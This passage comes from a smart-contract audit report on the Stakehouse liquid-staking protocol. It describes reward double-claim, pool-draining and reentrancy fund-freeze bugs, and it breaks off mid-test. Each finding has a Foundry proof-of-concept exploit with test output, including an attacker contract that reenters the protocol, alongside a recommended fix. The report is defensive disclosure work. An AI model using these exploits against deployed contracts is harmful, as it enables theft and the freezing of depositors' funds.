[cccz](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/219), [corerouter](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/213), [rotcivegaf](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/208), [koxuan](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/131), [aphak5010](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/130), [9svR6w](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/100), [HE1M](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/59), and [clems4ever](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/39)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L63><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88><br>\n\nThe SyndicateRewardsProcessor's internal `_distributeETHRewardsToUserForToken()` function is called from external `claimRewards()` function in the `StakingFundsVault` contract. This function is called by LP Token holders to claim their accumulated rewards based on their LP Token holdings and already claimed rewards.<br>\nThe accumulated rewards `due` are calculated as `((accumulatedETHPerLPShare * balance) / PRECISION)` reduced by the previous claimed amount stored in `claimed[_user][_token]`. When the ETH is sent to the `_user` the stored value should be increased by the `due` amount. However in the current code base the `claimed[_user][_token]` is set equal to the calculated `due`.\n\n```solidity\nfunction _distributeETHRewardsToUserForToken(\n        address _user,\n        address _token,\n        uint256 _balance,\n        address _recipient\n    ) internal {\n        require(_recipient != address(0), \"Zero address\");\n        uint256 balance = _balance;\n        if (balance > 0) {\n            // Calculate how much ETH rewards the address is owed / due \n            uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];\n            if (due > 0) {\n                claimed[_user][_token] = due;\n                totalClaimed += due;\n                (bool success, ) = _recipient.call{value: due}(\"\");\n\t\t\t\t...\n\t\t\t}\n        }\n    }\n```\n\nThis means the first time a user will claim their rewards they will get the correct amount and the correct value will be stored in the `claimed[_user][_token]`.  When extra ETH is recieved from the MEV and fees rewards and the user claims their reward again, the claimed amount will only reflect the last claimed amount. As a result they can then repeatedly claim untill the MEV and Fee vault is almost depleted.\n\n### Proof of Concept\n\nFollowing modification to the existing `StakingFundsVault.t.sol` will provide a test to demonstrate the issue:\n\n```diff\ndiff --git a/test/foundry/StakingFundsVault.t.sol b/test/foundry/StakingFundsVault.t.sol\nindex 53b4ce0..4db8fc8 100644\n--- a/test/foundry/StakingFundsVault.t.sol\n+++ b/test/foundry/StakingFundsVault.t.sol\n@@ -4,6 +4,7 @@ import \"forge-std/console.sol\";\n \n import { StakingFundsVault } from \"../../contracts/liquid-staking/StakingFundsVault.sol\";\n import { LPToken } from \"../../contracts/liquid-staking/LPToken.sol\";\n+import { SyndicateRewardsProcessor} from \"../../contracts/liquid-staking/SyndicateRewardsProcessor.sol\";\n import {\n     TestUtils,\n     MockLSDNFactory,\n@@ -417,4 +418,73 @@ contract StakingFundsVaultTest is TestUtils {\n         assertEq(vault.totalClaimed(), rewardsAmount);\n         assertEq(vault.totalRewardsReceived(), rewardsAmount);\n     }\n+\n+    function testRepetitiveClaim() public {\n+        // register BLS key with the network\n+        registerSingleBLSPubKey(accountTwo, blsPubKeyFour, accountFive);\n+\n+        vm.label(accountOne, \"accountOne\");\n+        vm.label(accountTwo, \"accountTwo\");\n+        // Do a deposit of 4 ETH for bls pub key four in the fees and mev pool\n+        depositETH(accountTwo, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour));\n+        depositETH(accountOne, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour));\n+\n+        // Do a deposit of 24 ETH for savETH pool\n+        liquidStakingManager.savETHVault().depositETHForStaking{value: 24 ether}(blsPubKeyFour, 24 ether);\n+\n+        stakeAndMintDerivativesSingleKey(blsPubKeyFour);\n+\n+        LPToken lpTokenBLSPubKeyFour = vault.lpTokenForKnot(blsPubKeyFour);\n+\n+        vm.warp(block.timestamp + 3 hours);\n+\n+        // Deal ETH to the staking funds vault\n+        uint256 rewardsAmount = 1.2 ether;\n+        console.log(\"depositing %s wei into the vault.\\n\", rewardsAmount);\n+        vm.deal(address(vault), rewardsAmount);\n+        assertEq(address(vault).balance, rewardsAmount);\n+        assertEq(vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2);\n+        assertEq(vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2);\n+\n+        logAccounts();\n+\n+        console.log(\"Claiming rewards for accountOne.\\n\");\n+        vm.prank(accountOne);\n+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));\n+        logAccounts();\n+\n+        console.log(\"depositing %s wei into the vault.\\n\", rewardsAmount);\n+        vm.deal(address(vault), address(vault).balance + rewardsAmount);\n+        vm.warp(block.timestamp + 3 hours);\n+        logAccounts();\n+\n+        console.log(\"Claiming rewards for accountOne.\\n\");\n+        vm.prank(accountOne);\n+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));\n+        logAccounts();\n+\n+        console.log(\"Claiming rewards for accountOne AGAIN.\\n\");\n+        vm.prank(accountOne);\n+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));\n+        logAccounts();\n+\n+        console.log(\"Claiming rewards for accountOne AGAIN.\\n\");\n+        vm.prank(accountOne);\n+        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour));\n+        logAccounts();\n+\n+        //console.log(\"Claiming rewards for accountTwo.\\n\");\n+        vm.prank(accountTwo);\n+        vault.claimRewards(accountTwo, getBytesArrayFromBytes(blsPubKeyFour));\n+\n+    }\n+\n+    function logAccounts() internal {\n+        console.log(\"accountOne previewAccumulatedETH : %i\", vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)));\n+        console.log(\"accountOne claimed               : %i\", SyndicateRewardsProcessor(vault).claimed(accountOne, address(vault.lpTokenForKnot(blsPubKeyFour))));\n+        console.log(\"accountTwo previewAccumulatedETH : %i\", vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)));\n+        console.log(\"accountTwo claimed               : %i\", SyndicateRewardsProcessor(vault).claimed(accountTwo, address(vault.lpTokenForKnot(blsPubKeyFour))));\n+        console.log(\"ETH Balances: accountOne: %i, accountTwo: %i, vault: %i\\n\", accountOne.balance, accountTwo.balance, address(vault).balance);\n+    }\n+\n }\n\n```\n\nNote that the AccountOne repeatedly claims until the vault is empty and the claim for accountTwo fails.\n\nFollowing is an output of the test script showing the balances and differnet state variables:\n\n```\nforge test -vv --match testRepetitiveClaim\n[⠑] Compiling...\nNo files changed, compilation skipped\n\nRunning 1 test for test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest\n[FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)\nLogs:\n  depositing 1200000000000000000 wei into the vault.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 0\n  accountTwo previewAccumulatedETH : 600000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 0, accountTwo: 0, vault: 1200000000000000000\n\n  Claiming rewards for accountOne.\n\n  accountOne previewAccumulatedETH : 0\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 600000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 600000000000000000\n\n  depositing 1200000000000000000 wei into the vault.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 1200000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 600000000000000000, accountTwo: 0, vault: 1800000000000000000\n\n  Claiming rewards for accountOne.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 1200000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 1200000000000000000, accountTwo: 0, vault: 1200000000000000000\n\n  Claiming rewards for accountOne AGAIN.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 1200000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 1800000000000000000, accountTwo: 0, vault: 600000000000000000\n\n  Claiming rewards for accountOne AGAIN.\n\n  accountOne previewAccumulatedETH : 600000000000000000\n  accountOne claimed               : 600000000000000000\n  accountTwo previewAccumulatedETH : 1200000000000000000\n  accountTwo claimed               : 0\n  ETH Balances: accountOne: 2400000000000000000, accountTwo: 0, vault: 0\n\n\nTest result: FAILED. 0 passed; 1 failed; finished in 15.64ms\n\nFailing tests:\nEncountered 1 failing test in test/foundry/StakingFundsVault.t.sol:StakingFundsVaultTest\n[FAIL. Reason: Failed to transfer] testRepetitiveClaim() (gas: 3602403)\n\nEncountered a total of 1 failing tests, 0 tests succeeded\n\n```\n\n### Tools Used\n\nManual review / forge test\n\n### Recommended Mitigation Steps\n\nThe `SyndicateRewardsProcessor` contract should be modified as follows:\n\n```diff\ndiff --git a/contracts/liquid-staking/SyndicateRewardsProcessor.sol b/contracts/liquid-staking/SyndicateRewardsProcessor.sol\nindex 81be706..9b9c502 100644\n--- a/contracts/liquid-staking/SyndicateRewardsProcessor.sol\n+++ b/contracts/liquid-staking/SyndicateRewardsProcessor.sol\n@@ -60,7 +60,7 @@ abstract contract SyndicateRewardsProcessor {\n             // Calculate how much ETH rewards the address is owed / due \n             uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];\n             if (due > 0) {\n-                claimed[_user][_token] = due;\n+                claimed[_user][_token] += due;\n \n                 totalClaimed += due;\n \n\n```\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/147)**\n\n\n\n***\n\n## [[H-10] `GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool` function loses the addition of the idleETH which allows attackers to steal most of eth from the Giant Pool](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/173)\n*Submitted by [ronnyx2017](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/173), also found by [Lambda](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/141)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178><br>\n\nThe contract GiantMevAndFeesPool override the function totalRewardsReceived:\n\n    return address(this).balance + totalClaimed - idleETH;\n\nThe function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the function `SyndicateRewardsProcessor._updateAccumulatedETHPerLP`\n\n    uint256 received = totalRewardsReceived();\n    uint256 unprocessed = received - totalETHSeen;\n\nThe idleETH will be decreased in the function `batchDepositETHForStaking` for sending eth to the staking pool. But the idleETH wont be increased in the function `bringUnusedETHBackIntoGiantPool` which is used to burn lp tokens in the staking pool, and the staking pool will send the eth back to the giant pool. And then because of the diminution of the idleETH, the `accumulatedETHPerLPShare` is added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.\n\n### Proof of Concept\n\ntest:<br>\ntest/foundry/TakeFromGiantPools.t.sol\n\n    pragma solidity ^0.8.13;\n\n    // SPDX-License-Identifier: MIT\n\n    import \"forge-std/console.sol\";\n    import {GiantPoolTests} from \"./GiantPools.t.sol\";\n    import { LPToken } from \"../../contracts/liquid-staking/LPToken.sol\";\n\n    contract TakeFromGiantPools is GiantPoolTests {\n        function testDWclaimRewards() public{\n            address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);\n            address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);\n            address feesAndMevUserTwo = accountThree; vm.deal(feesAndMevUserTwo, 4 ether);\n\n            // Register BLS key\n            registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);\n\n            // Deposit ETH into giant fees and mev\n            vm.startPrank(feesAndMevUserOne);\n            giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);\n            vm.stopPrank();\n            vm.startPrank(feesAndMevUserTwo);\n            giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);\n\n            bytes[][] memory blsKeysForVaults = new bytes[][](1);\n            blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);\n\n            uint256[][] memory stakeAmountsForVaults = new uint256[][](1);\n            stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);\n            giantFeesAndMevPool.batchDepositETHForStaking(\n                getAddressArrayFromValues(address(manager.stakingFundsVault())),\n                getUint256ArrayFromValues(4 ether),\n                blsKeysForVaults,\n                stakeAmountsForVaults\n            );\n            vm.warp(block.timestamp+31 minutes);\n            LPToken[] memory tokens = new LPToken[](1);\n            tokens[0] = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);\n\n            LPToken[][] memory allTokens = new LPToken[][](1);\n            allTokens[0] = tokens;\n            giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(\n                getAddressArrayFromValues(address(manager.stakingFundsVault())),\n                allTokens,\n                stakeAmountsForVaults\n            );\n            // inject a NOOP to skip some functions\n            address[] memory stakingFundsVaults = new address[](1);\n            bytes memory code = new bytes(1);\n            code[0] = 0x00;\n            vm.etch(address(0x123), code);\n            stakingFundsVaults[0] = address(0x123);\n            giantFeesAndMevPool.claimRewards(feesAndMevUserTwo, stakingFundsVaults, blsKeysForVaults);\n            vm.stopPrank();\n            console.log(\"user one:\", getBalance(feesAndMevUserOne));\n            console.log(\"user two(attacker):\", getBalance(feesAndMevUserTwo));\n            console.log(\"giantFeesAndMevPool:\", getBalance(address(giantFeesAndMevPool)));\n        }\n\n        function getBalance(address addr) internal returns (uint){\n            // giant LP : eth at ratio of 1:1\n            return addr.balance + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);\n        }\n\n    }\n\nrun test:\n\n    forge test --match-test testDWclaimRewards -vvv\n\ntest log:\n\n    Logs:\n      user one: 4000000000000000000\n      user two(attacker): 6000000000000000000\n      giantFeesAndMevPool: 6000000000000000000\n\nThe attacker stole 2 eth from the pool.\n\n### Tools Used\n\nfoundry\n\n### Recommended Mitigation Steps\n\nAdd\n\n    idleETH += _amounts[i];\n\nbefore burnLPTokensForETH in the GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool function.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/173)**\n\n\n\n***\n\n## [[H-11] Protocol insolvent - Permanent freeze of funds](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/176)\n*Submitted by [0xdeadbeef0x](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/176), also found by [joestakey](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/436)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524><br>\n\n*   Permanent freeze of funds - users who deposited ETH for staking will not be able to receive their funds, rewards or rotate to another token. The protocol becomes insolvent, it cannot pay anything to the users.\n*   Protocol's LifecycleStatus state machine is broken\n\nOther impacts:\n\n*   Users deposit funds to an unstakable validator (node runner has already took out his funds)\n\nImpact is also on the Giant Pools that give liquidity to the vaults.\n\nA competitor or malicious actor can cause bad PR for the protocol by causing permanent freeze of user funds at LSD stakehouse.\n\n### Proof of Concept\n\nThere are two main bugs that cause the above impact:\n\n1.  Reentrancy bug in `withdrawETHForKnot` function in `LiquidStakingManager.sol`\n2.  Improper balance check in `LiquidStakingManager.sol` for deposited node runner funds.\n\nFor easier reading and understanding, please follow the below full attack flow diagram when reading through the explanation.\n\n    ┌───────────┐               ┌───────────┐            ┌───────────┐              ┌───────────┐\n    │           │               │           │            │           │              │           │\n    │Node Runner│               │LSD Manager│            │   Vaults  │              │   Users   │\n    │           │               │           │            │           │              │           │\n    └─────┬─────┘               └─────┬─────┘            └─────┬─────┘              └─────┬─────┘\n          │                           │                        │                          │\n          │   Register BLS Key #1     │                        │                          │\n          ├──────────────────────────►│                        │                          │\n          │                           │                        │                          │\n          │   Register BLS Key #1     │                        │                          │\n          ├──────────────────────────►│                        │Deposit 24 ETH to savETH  │\n          │                           │                        │◄─────────────────────────┤\n          │                           │                        │                          │\n          │                           │                        │Deposit 4 ETH to mevAndFees\n          │                           │                        │◄─────────────────────────┐\n          │WithdrawETHForKnot BLS #1  │                        │                          │\n          ├──────────────────────────►│                        │                          │\n          │       Send 4 ETH          │                        │                          │\n          │◄──────────────────────────┤                        │                          │\n          │ Reenter stake function    │                        │                          │\n          ├──────────────────────────►│Get 28 ETH from vaults  │                          │\n          │                           ├───────────────────────►│                          │\n          │ ┌───────────────────────┐ │     Send 28 ETH        │                          │\n          │ │ Stake complete.       │ │◄───────────────────────┤                          │\n          │ │status=DEPOSIT_COMPLETE│ │                        │                          │\n          │ └───────────────────────┘ │                        │                          │\n          │Finished WithdrawETHForKnot│                        │                          │\n          │◄──────────────────────────┤                        │Users cannot mint derivati│es\n          │                           │                        │◄─────────────────────────┤\n          │    ┌──────────────────┐   │                        │Users cannot burnLPTokens │\n          │    │BLS Key #1 banned │   │                        │◄─────────────────────────┤\n          │    └──────────────────┘   │                        │Users cannot rotateTokens │\n          │                           │                        │◄─────────────────────────┤\n          │                           │                        │                          │\n\nLet's assume the following starting point:\n\n1.  Node runner registered and paid 4 ETH for BLS KEY `#1`\n2.  Node runner registered and paid 4 ETH for BLS KEY `#2`\n3.  savETH users collected 24 ETH ready for staking\n4.  mevAndFess users collected 4 ETH ready for staking\n\n**Reentrancy in `withdrawETHForKnot`**:\n\n`withdrawETHForKnot` is a function used in `LiquidStakingManager`. It is used to refund a node runner if funds are not yet staked and BAN the BLS key.\n\n`withdrawETHForKnot`:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326>\n\n        function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {\n    ....\n            IOwnableSmartWallet(associatedSmartWallet).rawExecute(\n                _recipient,\n                \"\",\n                4 ether\n            );\n    ....\n            bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;\n        }\n\nThe associatedSmartWallet will send the node runner 4 ETH (out of 8 currently in balance).\n\nPlease note:\n\n1.  The Node Runner can reenter the `LiquidStakingManager` when receiving the 4 ETH\n2.  `bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;` is only executed after the reentrancy\n\nWe can call any method we need with the following states:\n\n*   BLS key is NOT banned\n*   Status is `IDataStructures.LifecycleStatus.INITIALS_REGISTERED`\n\nThe node runner will call the `stake` function to stake the deposited funds from the vaults and change the status to `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`\n\n`stake`:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524>\n\n        function stake(\n            bytes[] calldata _blsPublicKeyOfKnots,\n            bytes[] calldata _ciphertexts,\n            bytes[] calldata _aesEncryptorKeys,\n            IDataStructures.EIP712Signature[] calldata _encryptionSignatures,\n            bytes32[] calldata _dataRoots\n        ) external {\n    ....\n                // check if BLS public key is registered with liquid staking derivative network and not banned\n                require(isBLSPublicKeyBanned(blsPubKey) == false, \"BLS public key is banned or not a part of LSD network\");\n    ....\n                require(\n                    getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n                    \"Initials not registered\"\n                );\n    ....\n                _assertEtherIsReadyForValidatorStaking(blsPubKey);\n\n                _stake(\n                    _blsPublicKeyOfKnots[i],\n                    _ciphertexts[i],\n                    _aesEncryptorKeys[i],\n                    _encryptionSignatures[i],\n                    _dataRoots[i]\n                );\n    ....\n        }\n\nThe `stake` function checks\n\n1.  That the BLS key is not banned. In our case its not yet banned, because the banning happens after the reentrancy\n2.  IDataStructures.LifecycleStatus.INITIALS_REGISTERED is the current Lifecycle status. Which it is.\n3.  There is enough balance in the vaults and node runners smart wallet in `_assertEtherIsReadyForValidatorStaking`\n\n`_assertEtherIsReadyForValidatorStaking`  checks that the node runners smart wallet has more than 4 ETH.\nBecause our node runner has two BLS keys registered, there is an additional 4 ETH on BLS Key #2 and the conditions will pass.\n\n`_assertEtherIsReadyForValidatorStaking`<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934>\n\n        function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {\n            address associatedSmartWallet = smartWalletOfKnot[blsPubKey];\n            require(associatedSmartWallet.balance >= 4 ether, \"Smart wallet balance must be at least 4 ether\");\n\n            LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);\n            require(address(stakingFundsLP) != address(0), \"No funds staked in staking funds vault\");\n            require(stakingFundsLP.totalSupply() == 4 ether, \"DAO staking funds vault balance must be at least 4 ether\");\n\n            LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);\n            require(address(savETHVaultLP) != address(0), \"No funds staked in savETH vault\");\n            require(savETHVaultLP.totalSupply() == 24 ether, \"KNOT must have 24 ETH in savETH vault\");\n        }\n\nSince we can pass all checks. `_stake` will be called which withdraws all needed funds from the vault and executes a call through the smart wallet to the `TransactionRouter` with 32 ETH needed for the stake. The `TransactionRouter` will process the funds and stake them. The `LifecycleStatus` will be updated to `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`\n\n`_stake`:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L739>\n\n        function _stake(\n            bytes calldata _blsPublicKey,\n            bytes calldata _cipherText,\n            bytes calldata _aesEncryptorKey,\n            IDataStructures.EIP712Signature calldata _encryptionSignature,\n            bytes32 dataRoot\n        ) internal {\n            address smartWallet = smartWalletOfKnot[_blsPublicKey];\n\n            // send 24 ether from savETH vault to smart wallet\n            savETHVault.withdrawETHForStaking(smartWallet, 24 ether);\n\n            // send 4 ether from DAO staking funds vault\n            stakingFundsVault.withdrawETH(smartWallet, 4 ether);\n\n            // interact with transaction router using smart wallet to deposit 32 ETH\n            IOwnableSmartWallet(smartWallet).execute(\n                address(getTransactionRouter()),\n                abi.encodeWithSelector(\n                    ITransactionRouter.registerValidator.selector,\n                    smartWallet,\n                    _blsPublicKey,\n                    _cipherText,\n                    _aesEncryptorKey,\n                    _encryptionSignature,\n                    dataRoot\n                ),\n                32 ether\n            );\n    ....\n        }\n\nAfter `_stake` and `stake` will finish executing we will finish the Cross-Function Reentrancy.\n\nThe protocol has entered the following state for the BLS key `#1`:\n\n1.  BLS Key `#1` is banned\n2.  LifecycleStatus is `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`\n\nIn such a state where the key is banned, no one can mint derivatives and therefor depositors cannot withdraw rewards/dETH:\n\n`mintDerivatives`:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L577>\n\n        function mintDerivatives(\n            bytes[] calldata _blsPublicKeyOfKnots,\n            IDataStructures.ETH2DataReport[] calldata _beaconChainBalanceReports,\n            IDataStructures.EIP712Signature[] calldata _reportSignatures\n        ) external {\n    ....\n                // check if BLS public key is registered and not banned\n                require(isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, \"BLS public key is banned or not a part of LSD network\");\n    ....\n\nVault LP Tokens cannot be burned for withdraws because that is not supported in `DEPOSIT_COMPLETE` state:\n\n`burnLPToken`:<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SavETHVault.sol#L126>\n\n        function burnLPToken(LPToken _lpToken, uint256 _amount) public nonReentrant returns (uint256) {\n    ...\n            bytes memory blsPublicKeyOfKnot = KnotAssociatedWithLPToken[_lpToken];\n            IDataStructures.LifecycleStatus validatorStatus = getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfKnot);\n\n            require(\n                validatorStatus == IDataStructures.LifecycleStatus.INITIALS_REGISTERED ||\n                validatorStatus == IDataStructures.LifecycleStatus.TOKENS_MINTED,\n                \"Cannot burn LP tokens\"\n            );\n    ....\n\nTokens cannot be rotated to other LP tokens because that is not supported in a DEPOSIT_COMPLETE state\n\n`rotateLPTokens`\n\n        function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {\n    ...\n            bytes memory blsPublicKeyOfPreviousKnot = KnotAssociatedWithLPToken[_oldLPToken];\n    ...\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfPreviousKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n                \"Lifecycle status must be one\"\n            );\n    ...\n\nFunds are stuck, they cannot be taken or used.<br>\nThe LifecycleStatus is also stuck, tokens cannot be minted.\n\n#### Foundry POC\n\nThe POC will showcase the scenario in the diagram.\n\nAdd the following contracts to `liquid-staking` folder:<br>\n<https://github.com/coade-423n4/2022-11-stakehouse/tree/main/contracts/testing/liquid-staking>\n\n    // SPDX-License-Identifier: MIT\n\n    pragma solidity 0.8.13;\n\n    import { LiquidStakingManager } from \"../../liquid-staking/LiquidStakingManager.sol\";\n    import { TestUtils } from \"../../../test/utils/TestUtils.sol\";\n\n    contract NodeRunner {\n        bytes blsPublicKey1;\n        LiquidStakingManager manager;\n        TestUtils testUtils;\n\n        constructor(LiquidStakingManager _manager, bytes memory _blsPublicKey1, bytes memory _blsPublicKey2, address _testUtils) payable public {\n            manager = _manager;\n            blsPublicKey1 = _blsPublicKey1;\n            testUtils = TestUtils(_testUtils);\n            //register BLS Key #1\n            manager.registerBLSPublicKeys{ value: 4 ether }(\n                testUtils.getBytesArrayFromBytes(blsPublicKey1),\n                testUtils.getBytesArrayFromBytes(blsPublicKey1),\n                address(0xdeadbeef)\n            );\n            // Register BLS Key #2\n            manager.registerBLSPublicKeys{ value: 4 ether }(\n                testUtils.getBytesArrayFromBytes(_blsPublicKey2),\n                testUtils.getBytesArrayFromBytes(_blsPublicKey2),\n                address(0xdeadbeef)\n            );\n        }\n        receive() external payable {\n            testUtils.stakeSingleBlsPubKey(blsPublicKey1);\n        }\n    }\n\nAdd the following imports to `LiquidStakingManager.t.sol`<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12>\n\n    import { NodeRunner } from \"../../contracts/testing/liquid-staking/NodeRunner.sol\";\n    import { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\n\nAdd the following test to `LiquidStakingManager.t.sol`<br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L121>\n\n```\n    function testLockStakersFunds() public {\n        uint256 startAmount = 8 ether;\n        // Create NodeRunner. Constructor registers two BLS Keys\n        address nodeRunner = address(new NodeRunner{value: startAmount}(manager, blsPubKeyOne, blsPubKeyTwo, address(this)));\n        \n        // Simulate state transitions in lifecycle status to initials registered (value of 1)\n        MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);\n\n        // savETHUser, feesAndMevUser funds used to deposit into validator BLS key #1\n        address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);\n        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n        \n        // deposit savETHUser, feesAndMevUser funds for validator #1\n        depositIntoDefaultSavETHVault(savETHUser, blsPubKeyOne, 24 ether);\n        depositIntoDefaultStakingFundsVault(feesAndMevUser, blsPubKeyOne, 4 ether);\n\n        // withdraw ETH for first BLS key and reenter\n        // This will perform a cross-function reentracy to call stake\n        vm.startPrank(nodeRunner);\n        manager.withdrawETHForKnot(nodeRunner, blsPubKeyOne);\n        // Simulate state transitions in lifecycle status to ETH deposited (value of 2)\n        // In real deployment, when stake is called TransactionRouter.registerValidator is called to change the state to DEPOSIT_COMPLETE \n        MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 2);\n        vm.stopPrank();\n        \n        // Validate mintDerivatives reverts because of banned public key \n        (,IDataStructures.ETH2DataReport[] memory reports) = getFakeBalanceReport();\n        (,IDataStructures.EIP712Signature[] memory sigs) = getFakeEIP712Signature();\n        vm.expectRevert(\"BLS public key is banned or not a part of LSD network\");\n        manager.mintDerivatives(\n            getBytesArrayFromBytes(blsPubKeyOne),\n            reports,\n            sigs\n        );\n\n        // Validate depositor cannot burn LP tokens\n        vm.startPrank(savETHUser);\n        